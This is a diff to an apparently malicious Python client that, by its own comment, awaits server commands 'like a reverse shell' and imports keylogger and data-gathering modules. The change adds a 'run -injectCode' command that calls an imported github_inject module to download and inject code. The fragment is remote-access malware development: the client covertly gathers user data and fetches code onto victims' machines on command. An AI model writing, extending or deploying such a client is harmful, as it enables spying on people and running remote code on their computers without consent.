@@ -2,6 +2,7 @@ import socket
 import userscanner
 import keylogger
 import getuser_pc
+import github_inject
 # TODO finish a client command structure
 """ 
     This will await commands from the server something like a reverse shell
@@ -53,7 +54,13 @@ def start_client():
                                 case "run -gatherData":
                                     getuser_pc.startGathering()
                                     print("Gathering Data")
-                                    data=" "
+                                    data=""
+
+                                case "run -injectCode":
+                                    github_inject.start_downloading()
+                                    print("Injecting code")
+                                    data = ""
+                                    
 
 if __name__ == "__main__":
     while True:
